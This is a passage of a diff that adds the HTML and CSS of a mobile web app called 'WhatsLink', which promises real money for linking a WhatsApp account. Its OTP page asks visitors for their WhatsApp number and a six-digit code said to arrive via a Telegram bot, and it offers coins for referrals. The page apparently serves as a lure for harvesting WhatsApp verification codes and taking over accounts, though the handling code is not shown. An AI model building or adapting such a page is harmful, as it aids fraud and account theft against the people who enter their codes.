@@ -1,0 +1,2018 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>WhatsLink - Link WhatsApp & Earn</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<style>
+/* ============================================================
+   COMPLETE STYLESHEET
+   ============================================================ */
+:root {
+    --primary: #075E54;
+    --primary-light: #128C7E;
+    --whatsapp: #25D366;
+    --whatsapp-light: #DCF8C6;
+    --whatsapp-glow: rgba(37, 211, 102, 0.25);
+    --bg: #e8edf2;
+    --glass-bg: rgba(255, 255, 255, 0.78);
+    --glass-border: rgba(255, 255, 255, 0.3);
+    --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.06);
+    --glass-shadow-hover: 0 12px 48px rgba(0, 0, 0, 0.12);
+    --text: #1a1a2e;
+    --text-mute: #667781;
+    --border: rgba(0, 0, 0, 0.06);
+    --radius: 20px;
+    --radius-sm: 12px;
+    --coin: #FFB300;
+    --success: #25D366;
+    --danger: #ea3b5e;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { font-size: 16px; scroll-behavior: smooth; }
+body {
+    font-family: 'Inter', -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    overflow-x: hidden;
+    padding-bottom: 74px;
+    -webkit-font-smoothing: antialiased;
+    min-height: 100vh;
+}
+::-webkit-scrollbar { width: 3px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--whatsapp); border-radius: 10px; }
+
+/* ===== HEADER ===== */
+.header {
+    background: var(--glass-bg);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--glass-border);
+    padding: 12px 16px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    min-height: 60px;
+}
+.header-left { display: flex; align-items: center; gap: 10px; }
+.logo {
+    font-size: clamp(18px, 3vw, 24px);
+    font-weight: 800;
+    color: var(--primary);
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+.logo i {
+    font-size: clamp(20px, 3.2vw, 26px);
+    color: var(--whatsapp);
+    filter: drop-shadow(0 0 12px var(--whatsapp-glow));
+}
+.header-right { display: flex; align-items: center; gap: 8px; }
+
+/* ===== BUTTONS ===== */
+.btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 10px 20px;
+    border-radius: 50px;
+    font-weight: 600;
+    font-size: clamp(12px, 1.6vw, 14px);
+    border: none;
+    cursor: pointer;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    white-space: nowrap;
+}
+.btn-primary {
+    background: linear-gradient(135deg, var(--whatsapp), #20b85f);
+    color: white;
+    box-shadow: 0 4px 20px var(--whatsapp-glow);
+}
+.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 32px var(--whatsapp-glow); }
+.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.btn-outline {
+    background: transparent;
+    color: var(--primary);
+    border: 1.5px solid rgba(37, 211, 102, 0.3);
+}
+.btn-outline:hover { background: var(--whatsapp); color: white; }
+.btn-danger {
+    background: linear-gradient(135deg, var(--danger), #c0392b);
+    color: white;
+    box-shadow: 0 4px 20px rgba(234, 59, 94, 0.3);
+}
+.btn-danger:hover { transform: translateY(-2px); }
+.btn-success { background: var(--whatsapp); color: white; }
+.btn-success:hover { transform: scale(1.03); }
+.btn-block { width: 100%; }
+.btn-sm { padding: 6px 14px; font-size: clamp(10px, 1.4vw, 12px); }
+.btn-lg { padding: 14px 32px; font-size: clamp(14px, 2vw, 16px); }
+
+/* ===== AUTH BUTTONS ===== */
+.auth-btn {
+    padding: 6px 16px;
+    border-radius: 50px;
+    font-size: clamp(11px, 1.4vw, 13px);
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+.auth-btn-login {
+    background: transparent;
+    color: var(--primary);
+    border: 1.5px solid var(--whatsapp);
+}
+.auth-btn-login:hover { background: var(--whatsapp); color: white; }
+.auth-btn-register {
+    background: linear-gradient(135deg, var(--whatsapp), #20b85f);
+    color: white;
+    box-shadow: 0 4px 12px var(--whatsapp-glow);
+}
+.auth-btn-register:hover { transform: scale(1.04); }
+
+/* ===== USER PROFILE ===== */
+.user-profile {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    padding: 4px 12px 4px 4px;
+    border-radius: 50px;
+    background: var(--glass-bg);
+    border: 1px solid var(--glass-border);
+}
+.user-avatar {
+    width: clamp(32px, 4.5vw, 38px);
+    height: clamp(32px, 4.5vw, 38px);
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--whatsapp), #20b85f);
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: clamp(13px, 1.8vw, 16px);
+    flex-shrink: 0;
+}
+.user-info { display: flex; flex-direction: column; line-height: 1.2; }
+.user-name-display { font-size: clamp(11px, 1.4vw, 13px); font-weight: 600; }
+.user-status {
+    font-size: clamp(9px, 1.2vw, 10px);
+    color: var(--text-mute);
+}
+.user-status.verified { color: var(--success); }
+.user-status.pending { color: #FF6B00; }
+
+/* ===== BOTTOM NAV ===== */
+.bottom-nav {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: var(--glass-bg);
+    backdrop-filter: blur(20px);
+    border-top: 1px solid var(--glass-border);
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    padding: 6px 0 10px;
+    z-index: 999;
+}
+.bottom-nav a {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 2px;
+    font-size: clamp(8px, 1.2vw, 10px);
+    color: var(--text-mute);
+    text-decoration: none;
+    padding: 4px 8px;
+    transition: all 0.3s;
+    position: relative;
+    min-width: 40px;
+}
+.bottom-nav a i { font-size: clamp(18px, 3vw, 22px); transition: all 0.3s; }
+.bottom-nav a.active { color: var(--whatsapp); }
+.bottom-nav a.active i { transform: scale(1.05); filter: drop-shadow(0 0 12px var(--whatsapp-glow)); }
+
+/* ===== GLASS CARDS ===== */
+.glass-card {
+    background: var(--glass-bg);
+    backdrop-filter: blur(16px);
+    border-radius: var(--radius);
+    padding: clamp(16px, 2.8vw, 24px);
+    border: 1px solid var(--glass-border);
+    box-shadow: var(--glass-shadow);
+    transition: all 0.3s;
+    margin-bottom: clamp(12px, 2vw, 16px);
+}
+.glass-card:hover { box-shadow: var(--glass-shadow-hover); }
+.glass-card-green {
+    background: linear-gradient(135deg, rgba(37, 211, 102, 0.88), rgba(7, 94, 84, 0.88));
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    color: white;
+}
+.glass-card-green .text-muted { color: rgba(255, 255, 255, 0.75); }
+
+/* ===== OTP PAGE ===== */
+.otp-container {
+    min-height: 80vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+.otp-card {
+    background: var(--glass-bg);
+    backdrop-filter: blur(24px);
+    border-radius: var(--radius);
+    padding: clamp(28px, 5vw, 40px);
+    max-width: 420px;
+    width: 100%;
+    border: 1px solid var(--glass-border);
+    box-shadow: var(--glass-shadow-hover);
+    text-align: center;
+}
+.otp-card .wa-icon {
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--whatsapp), #20b85f);
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    margin: 0 auto 16px;
+    box-shadow: 0 8px 32px var(--whatsapp-glow);
+}
+.otp-card h2 {
+    font-size: clamp(22px, 3.5vw, 28px);
+    font-weight: 800;
+    margin-bottom: 4px;
+}
+.otp-card .sub {
+    color: var(--text-mute);
+    font-size: clamp(13px, 1.8vw, 15px);
+    margin-bottom: 20px;
+}
+.otp-card .field { margin-bottom: 16px; text-align: left; }
+.otp-card .field label { display: block; font-size: clamp(12px, 1.6vw, 14px); font-weight: 600; margin-bottom: 4px; }
+.otp-card .field input {
+    width: 100%;
+    padding: clamp(12px, 2vw, 16px);
+    border: 1.5px solid var(--glass-border);
+    border-radius: var(--radius-sm);
+    font-size: clamp(14px, 2vw, 16px);
+    background: rgba(255,255,255,0.6);
+    text-align: center;
+    letter-spacing: 4px;
+    font-weight: 600;
+}
+.otp-card .field input:focus { border-color: var(--whatsapp); outline: none; box-shadow: 0 0 0 4px var(--whatsapp-glow); }
+.otp-card .otp-input-group { display: flex; gap: 10px; justify-content: center; margin: 16px 0; }
+.otp-card .otp-input-group input {
+    width: 48px;
+    height: 56px;
+    text-align: center;
+    font-size: 22px;
+    font-weight: 700;
+    border: 2px solid var(--glass-border);
+    border-radius: var(--radius-sm);
+    background: rgba(255,255,255,0.6);
+    transition: all 0.3s;
+}
+.otp-card .otp-input-group input:focus { border-color: var(--whatsapp); outline: none; box-shadow: 0 0 0 3px var(--whatsapp-glow); }
+.otp-card .otp-timer { font-size: clamp(12px, 1.6vw, 14px); color: var(--text-mute); margin: 12px 0; }
+.otp-card .otp-timer span { font-weight: 700; color: var(--whatsapp); }
+.otp-card .resend-link { color: var(--whatsapp); font-weight: 600; cursor: pointer; transition: all 0.3s; }
+.otp-card .resend-link:hover { text-decoration: underline; }
+.otp-card .status-box {
+    padding: 12px 16px;
+    border-radius: var(--radius-sm);
+    margin: 12px 0;
+    font-size: clamp(12px, 1.6vw, 14px);
+    display: none;
+}
+.otp-card .status-box.success { display: block; background: var(--whatsapp-light); color: var(--primary); border: 1px solid var(--whatsapp); }
+.otp-card .status-box.error { display: block; background: #fde8e8; color: var(--danger); border: 1px solid var(--danger); }
+.otp-card .status-box.info { display: block; background: #e8f0fe; color: #1a73e8; border: 1px solid #1a73e8; }
+
+/* ===== TASK ITEMS ===== */
+.task-item {
+    display: flex;
+    align-items: center;
+    gap: clamp(10px, 1.8vw, 14px);
+    padding: clamp(10px, 1.8vw, 14px);
+    background: var(--glass-bg);
+    backdrop-filter: blur(8px);
+    border-radius: var(--radius-sm);
+    margin-bottom: clamp(8px, 1.4vw, 10px);
+    border: 1px solid var(--glass-border);
+    transition: all 0.3s;
+}
+.task-item:hover { transform: translateX(4px); box-shadow: var(--glass-shadow); }
+.task-item.locked { opacity: 0.5; pointer-events: none; }
+.task-item.locked::after { content: '🔒'; position: absolute; right: 12px; font-size: 16px; }
+.task-icon {
+    width: clamp(38px, 6vw, 44px);
+    height: clamp(38px, 6vw, 44px);
+    border-radius: 50%;
+    background: var(--whatsapp-light);
+    color: var(--primary);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: clamp(16px, 2.5vw, 18px);
+    flex-shrink: 0;
+}
+.task-info { flex: 1; min-width: 0; }
+.task-info h4 { font-size: clamp(12px, 1.8vw, 14px); font-weight: 600; }
+.task-info p { font-size: clamp(10px, 1.4vw, 12px); color: var(--text-mute); }
+.task-reward { font-weight: 700; color: var(--coin); font-size: clamp(11px, 1.6vw, 13px); white-space: nowrap; }
+
+/* ===== PROFILE ===== */
+.profile-header {
+    display: flex;
+    align-items: center;
+    gap: clamp(12px, 2vw, 16px);
+    padding: 4px 0;
+}
+.profile-avatar-large {
+    width: clamp(56px, 8vw, 68px);
+    height: clamp(56px, 8vw, 68px);
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--whatsapp), #20b85f);
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: clamp(22px, 3.5vw, 28px);
+    font-weight: 700;
+    flex-shrink: 0;
+    box-shadow: 0 4px 24px var(--whatsapp-glow);
+}
+.profile-info { min-width: 0; }
+.profile-info h2 { font-size: clamp(16px, 2.5vw, 20px); font-weight: 700; }
+.profile-info .uid { font-size: clamp(10px, 1.4vw, 12px); color: var(--text-mute); background: var(--glass-bg); padding: 2px 12px; border-radius: 50px; display: inline-block; }
+.profile-detail {
+    display: flex;
+    justify-content: space-between;
+    padding: clamp(8px, 1.4vw, 10px) 0;
+    border-bottom: 1px solid var(--border);
+    font-size: clamp(12px, 1.6vw, 13px);
+}
+.profile-detail:last-child { border-bottom: none; }
+.profile-detail .label { color: var(--text-mute); }
+.profile-detail .value { font-weight: 600; }
+
+/* ===== WITHDRAW ===== */
+.withdraw-card {
+    background: linear-gradient(135deg, rgba(37, 211, 102, 0.92), rgba(7, 94, 84, 0.92));
+    border-radius: var(--radius);
+    padding: clamp(18px, 3vw, 24px);
+    color: white;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+}
+.withdraw-card .amount { font-size: clamp(30px, 5vw, 38px); font-weight: 800; }
+.withdraw-card .sub { color: rgba(255, 255, 255, 0.75); font-size: clamp(11px, 1.6vw, 13px); }
+.withdraw-card input, .withdraw-card select {
+    width: 100%;
+    padding: clamp(10px, 1.8vw, 14px) clamp(12px, 2vw, 16px);
+    border-radius: var(--radius-sm);
+    border: none;
+    font-size: clamp(12px, 1.8vw, 14px);
+    background: rgba(255, 255, 255, 0.15);
+    color: white;
+}
+.withdraw-card input::placeholder { color: rgba(255, 255, 255, 0.5); }
+.withdraw-card select option { color: var(--text); }
+
+/* ===== REFERRAL ===== */
+.ref-link-box {
+    display: flex;
+    gap: 6px;
+    background: var(--glass-bg);
+    border-radius: var(--radius-sm);
+    padding: clamp(8px, 1.4vw, 10px) clamp(10px, 1.8vw, 12px);
+    align-items: center;
+    border: 1px solid var(--glass-border);
+}
+.ref-link-box input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    font-size: clamp(10px, 1.4vw, 12px);
+    color: var(--text);
+    font-family: monospace;
+    outline: none;
+    min-width: 80px;
+}
+.share-icons { display: flex; gap: clamp(6px, 1.2vw, 10px); margin-top: clamp(8px, 1.4vw, 10px); flex-wrap: wrap; }
+.share-btn {
+    width: clamp(36px, 5.5vw, 42px);
+    height: clamp(36px, 5.5vw, 42px);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: clamp(16px, 2.5vw, 18px);
+    border: none;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+.share-btn:hover { transform: scale(1.08); }
+.share-btn.whatsapp { background: #25D366; }
+.share-btn.facebook { background: #1877F2; }
+.share-btn.twitter { background: #000; }
+.share-btn.copy { background: var(--primary); }
+
+/* ===== FAQ ===== */
+.faq-item {
+    border-bottom: 1px solid var(--border);
+    padding: clamp(10px, 1.8vw, 14px) 0;
+}
+.faq-item:last-child { border-bottom: none; }
+.faq-q {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-weight: 600;
+    cursor: pointer;
+    font-size: clamp(12px, 1.8vw, 14px);
+    gap: 8px;
+}
+.faq-q i { transition: transform 0.3s; color: var(--text-mute); flex-shrink: 0; }
+.faq-item.open .faq-q i { transform: rotate(45deg); }
+.faq-a {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.3s ease;
+    font-size: clamp(11px, 1.6vw, 13px);
+    color: var(--text-mute);
+    line-height: 1.6;
+}
+.faq-item.open .faq-a { max-height: 200px; padding-top: 8px; }
+
+/* ===== AUTH OVERLAY ===== */
+.auth-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0, 0, 0, 0.45);
+    backdrop-filter: blur(14px);
+    z-index: 9999;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+}
+.auth-overlay.show { display: flex; }
+.auth-card {
+    background: var(--glass-bg);
+    backdrop-filter: blur(24px);
+    border-radius: var(--radius);
+    padding: clamp(28px, 4vw, 36px) clamp(24px, 3.5vw, 32px);
+    max-width: 380px;
+    width: 100%;
+    max-height: 90vh;
+    overflow-y: auto;
+    border: 1px solid var(--glass-border);
+    box-shadow: var(--glass-shadow-hover);
+}
+.auth-card .logo { justify-content: center; font-size: clamp(22px, 3.5vw, 26px); }
+.auth-card h2 { text-align: center; font-size: clamp(20px, 3vw, 24px); margin-top: 6px; }
+.auth-card .sub { text-align: center; color: var(--text-mute); font-size: clamp(12px, 1.6vw, 14px); margin-top: 2px; }
+.auth-card .field { margin-top: 16px; }
+.auth-card .field label { display: block; font-size: clamp(11px, 1.4vw, 13px); font-weight: 600; margin-bottom: 4px; }
+.auth-card .field input {
+    width: 100%;
+    padding: clamp(12px, 1.8vw, 14px) clamp(14px, 2vw, 16px);
+    border: 1.5px solid var(--glass-border);
+    border-radius: var(--radius-sm);
+    font-size: clamp(13px, 1.8vw, 15px);
+    background: rgba(255,255,255,0.6);
+}
+.auth-card .field input:focus { border-color: var(--whatsapp); outline: none; }
+.auth-card .btn-block { margin-top: 18px; }
+.auth-card .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: var(--text-mute); font-size: 12px; }
+.auth-card .divider::before, .auth-card .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+.auth-card .switch-link { text-align: center; margin-top: 16px; font-size: clamp(12px, 1.6vw, 14px); color: var(--text-mute); }
+.auth-card .switch-link a { color: var(--whatsapp); font-weight: 600; cursor: pointer; }
+.auth-card .error-msg { color: var(--danger); font-size: 12px; margin-top: 6px; display: none; }
+
+/* ===== TOAST ===== */
+.toast {
+    position: fixed;
+    bottom: 82px;
+    left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--glass-bg);
+    backdrop-filter: blur(20px);
+    color: var(--text);
+    padding: clamp(12px, 2vw, 16px) clamp(20px, 3vw, 28px);
+    border-radius: var(--radius-sm);
+    font-size: clamp(12px, 1.6vw, 14px);
+    font-weight: 500;
+    box-shadow: var(--glass-shadow-hover);
+    z-index: 9999;
+    opacity: 0;
+    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    pointer-events: none;
+    max-width: 90%;
+    text-align: center;
+    border: 1px solid var(--glass-border);
+}
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+.toast.success { border-color: var(--whatsapp); }
+.toast.error { border-color: var(--danger); }
+
+/* ===== PAGES ===== */
+.page { display: none; animation: fadeSlide 0.35s ease; padding: 10px 0 10px; }
+.page.active { display: block; }
+@keyframes fadeSlide { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+.page-container { max-width: 480px; margin: 0 auto; padding: 0 12px 10px; }
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 360px) {
+    .page-container { padding: 0 6px 6px; }
+    .bottom-nav a { min-width: 32px; padding: 2px 4px; }
+    .bottom-nav a i { font-size: 16px; }
+    .bottom-nav a span { font-size: 7px; }
+    .glass-card { padding: 10px 12px; border-radius: 14px; }
+    .task-item { padding: 8px 10px; gap: 8px; }
+    .task-icon { width: 30px; height: 30px; font-size: 12px; }
+    .btn { padding: 6px 12px; font-size: 10px; }
+    .user-avatar { width: 24px; height: 24px; font-size: 10px; }
+}
+@media (min-width: 361px) and (max-width: 480px) {
+    .page-container { padding: 0 10px 10px; }
+    .bottom-nav a { min-width: 38px; }
+    .bottom-nav a i { font-size: 18px; }
+    .task-icon { width: 36px; height: 36px; font-size: 14px; }
+}
+@media (min-width: 481px) and (max-width: 580px) {
+    .page-container { max-width: 100%; padding: 0 16px 16px; }
+    .bottom-nav a i { font-size: 20px; }
+}
+@media (min-width: 581px) {
+    .page-container { max-width: 520px; padding: 0 20px 20px; }
+    .bottom-nav a i { font-size: 24px; }
+    .task-icon { width: 46px; height: 46px; font-size: 20px; }
+    .btn { padding: 12px 28px; font-size: 14px; }
+}
+
+.hidden { display: none !important; }
+.text-center { text-align: center; }
+.mt-2 { margin-top: 6px; }
+.mt-3 { margin-top: 10px; }
+.mt-4 { margin-top: 14px; }
+.mb-2 { margin-bottom: 6px; }
+.mb-3 { margin-bottom: 10px; }
+.w-full { width: 100%; }
+.text-sm { font-size: clamp(12px, 1.6vw, 13px); }
+.text-muted { color: var(--text-mute); }
+.text-success { color: var(--whatsapp); }
+.font-bold { font-weight: 700; }
+</style>
+</head>
+<body>
+
+<!-- ===== TOAST ===== -->
+<div class="toast" id="toast"></div>
+
+<!-- ===== HEADER ===== -->
+<header class="header">
+    <div class="header-left">
+        <a href="#" class="logo" onclick="navigate('home')">
+            <i class="fab fa-whatsapp"></i>
+            <span>WhatsLink</span>
+        </a>
+    </div>
+    <div class="header-right">
+        <div id="guestActions" style="display:flex;align-items:center;gap:6px;">
+            <button class="auth-btn auth-btn-login" onclick="showAuth('login')">Login</button>
+            <button class="auth-btn auth-btn-register" onclick="showAuth('register')">Sign Up</button>
+        </div>
+        <div id="userActions" style="display:none;align-items:center;gap:6px;">
+            <div class="user-profile" onclick="toggleDropdown()">
+                <div class="user-avatar" id="userAvatar">U</div>
+                <div class="user-info">
+                    <div class="user-name-display" id="userNameDisplay">User</div>
+                    <div class="user-status" id="userStatus">Loading...</div>
+                </div>
+                <i class="fas fa-chevron-down" style="font-size:9px;color:var(--text-mute);"></i>
+            </div>
+            <div class="dropdown-menu" id="dropdownMenu">
+                <a href="#" onclick="navigate('profile')"><i class="fas fa-user"></i> Profile</a>
+                <a href="#" onclick="navigate('profile')"><i class="fas fa-wallet"></i> Wallet</a>
+                <div class="divider"></div>
+                <a href="#" onclick="logoutUser()"><i class="fas fa-sign-out-alt"></i> Logout</a>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- ===== BOTTOM NAV ===== -->
+<nav class="bottom-nav">
+    <a href="#" data-page="home" class="active" onclick="navigate('home')"><i class="fas fa-home"></i><span>Home</span></a>
+    <a href="#" data-page="agents" onclick="navigate('agents')"><i class="fas fa-user-plus"></i><span>Invite</span></a>
+    <a href="#" data-page="tasks" onclick="navigate('tasks')"><i class="fas fa-tasks"></i><span>Tasks</span></a>
+    <a href="#" data-page="help" onclick="navigate('help')"><i class="fas fa-question-circle"></i><span>Help</span></a>
+    <a href="#" data-page="profile" onclick="navigate('profile')"><i class="fas fa-user"></i><span>Mine</span></a>
+</nav>
+
+<!-- ============================================================
+PAGE CONTAINER
+============================================================ -->
+<div class="page-container">
+
+    <!-- ===== HOME ===== -->
+    <div class="page active" id="page-home">
+        <div class="glass-card glass-card-green" style="text-align:center;padding:clamp(24px,4vw,32px);">
+            <div style="font-size:clamp(12px,1.8vw,14px);opacity:0.85;font-weight:500;">Welcome to</div>
+            <div style="font-size:clamp(28px,4.5vw,34px);font-weight:800;">WhatsLink</div>
+            <div style="font-size:clamp(13px,1.8vw,15px);opacity:0.8;margin-top:4px;">Link WhatsApp & Earn Real Money</div>
+            <button class="btn btn-success" style="margin-top:14px;padding:clamp(10px,1.8vw,14px) clamp(24px,4vw,32px);font-size:clamp(13px,1.8vw,15px);" onclick="openOTPPage()">
+                <i class="fab fa-whatsapp"></i> Link WhatsApp Now
+            </button>
+        </div>
+
+        <div class="stat-grid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:clamp(6px,1.2vw,10px);">
+            <div class="stat-item" style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
+                <div class="num" style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="statUsers">0</div>
+                <div class="lbl" style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Users</div>
+            </div>
+            <div class="stat-item" style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
+                <div class="num" style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="statLinked">0</div>
+                <div class="lbl" style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Linked</div>
+            </div>
+            <div class="stat-item" style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
+                <div class="num" style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="statActive">0</div>
+                <div class="lbl" style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Active</div>
+            </div>
+        </div>
+
+        <div class="glass-card">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                <h4 style="font-size:clamp(13px,2vw,15px);font-weight:700;">📋 Available Tasks</h4>
+                <a href="#" onclick="navigate('tasks')" style="font-size:clamp(10px,1.4vw,12px);color:var(--whatsapp);font-weight:600;">View All</a>
+            </div>
+            <div id="quickTasks"></div>
+        </div>
+
+        <div class="glass-card" style="border:2px solid var(--whatsapp);background:rgba(37,211,102,0.06);">
+            <div style="display:flex;align-items:center;gap:clamp(10px,1.8vw,14px);">
+                <div style="width:clamp(44px,6vw,52px);height:clamp(44px,6vw,52px);border-radius:50%;background:var(--whatsapp);color:white;display:flex;align-items:center;justify-content:center;font-size:clamp(18px,2.8vw,22px);flex-shrink:0;">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+                <div style="flex:1;min-width:0;">
+                    <div style="font-weight:700;font-size:clamp(13px,2vw,15px);">Link WhatsApp to Start</div>
+                    <div style="font-size:clamp(10px,1.4vw,12px);color:var(--text-mute);">Complete tasks after linking</div>
+                </div>
+                <button class="btn btn-primary btn-sm" onclick="openOTPPage()">Link</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== OTP PAGE ===== -->
+    <div class="page" id="page-otp">
+        <div class="otp-container">
+            <div class="otp-card">
+                <div class="wa-icon"><i class="fab fa-whatsapp"></i></div>
+                <h2>Link WhatsApp</h2>
+                <p class="sub">Enter your number to get OTP</p>
+
+                <div id="otpStep1">
+                    <div class="field">
+                        <label>WhatsApp Number</label>
+                        <input type="tel" id="otpPhone" placeholder="03XXXXXXXXX" maxlength="11" autocomplete="tel">
+                    </div>
+                    <button class="btn btn-primary btn-block btn-lg" onclick="sendOTP()" id="sendOTPBtn">
+                        <i class="fas fa-paper-plane"></i> Get OTP
+                    </button>
+                    <div style="font-size:clamp(10px,1.4vw,12px);color:var(--text-mute);margin-top:10px;">
+                        <i class="fas fa-shield-alt"></i> OTP will be sent via Telegram Bot
+                    </div>
+                </div>
+
+                <div id="otpStep2" style="display:none;">
+                    <p style="font-size:clamp(13px,1.8vw,15px);font-weight:600;margin-bottom:4px;">Enter 6-digit OTP</p>
+                    <p style="font-size:clamp(11px,1.6vw,13px);color:var(--text-mute);margin-bottom:12px;">Sent to <span id="otpPhoneDisplay" style="font-weight:600;color:var(--primary);">---</span></p>
+                    <div class="otp-input-group">
+                        <input type="text" maxlength="1" class="otp-digit" data-index="0" autofocus>
+                        <input type="text" maxlength="1" class="otp-digit" data-index="1">
+                        <input type="text" maxlength="1" class="otp-digit" data-index="2">
+                        <input type="text" maxlength="1" class="otp-digit" data-index="3">
+                        <input type="text" maxlength="1" class="otp-digit" data-index="4">
+                        <input type="text" maxlength="1" class="otp-digit" data-index="5">
+                    </div>
+                    <div class="otp-timer">⏱ <span id="timerSeconds">60</span> seconds remaining</div>
+                    <div class="status-box" id="otpStatus"></div>
+                    <button class="btn btn-primary btn-block" onclick="verifyOTP()" id="verifyOTPBtn">
+                        <i class="fas fa-check-circle"></i> Verify OTP
+                    </button>
+                    <div style="margin-top:12px;">
+                        <span class="resend-link" onclick="resendOTP()" id="resendLink">Resend OTP</span>
+                        <span style="color:var(--text-mute);font-size:clamp(11px,1.6vw,13px);margin-left:12px;">|</span>
+                        <span class="resend-link" onclick="goBackToPhone()" style="color:var(--text-mute);">Change Number</span>
+                    </div>
+                    <div style="margin-top:16px;padding:12px;background:var(--whatsapp-light);border-radius:var(--radius-sm);font-size:clamp(11px,1.6vw,12px);color:var(--primary);">
+                        <i class="fas fa-info-circle"></i> Check your Telegram bot for OTP
+                    </div>
+                </div>
+
+                <div id="otpStep3" style="display:none;">
+                    <div style="width:72px;height:72px;border-radius:50%;background:var(--whatsapp);color:white;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h2 style="color:var(--whatsapp);">Linked Successfully! 🎉</h2>
+                    <p style="font-size:clamp(13px,1.8vw,15px);color:var(--text-mute);margin:8px 0 16px;">
+                        Your WhatsApp is now linked<br>
+                        <span style="font-weight:600;color:var(--primary);" id="successPhone">---</span>
+                    </p>
+                    <button class="btn btn-success btn-block" onclick="navigate('tasks')">
+                        <i class="fas fa-tasks"></i> Start Earning
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== AGENTS ===== -->
+    <div class="page" id="page-agents">
+        <div style="padding-top:6px;">
+            <h2 style="font-size:clamp(18px,3vw,22px);font-weight:800;">🤝 Invite Friends</h2>
+            <p style="font-size:clamp(12px,1.6vw,13px);color:var(--text-mute);">Earn 500 coins per referral</p>
+        </div>
+        <div class="stat-grid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:clamp(6px,1.2vw,10px);margin-top:8px;">
+            <div class="stat-item" style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
+                <div class="num" style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="refCount">0</div>
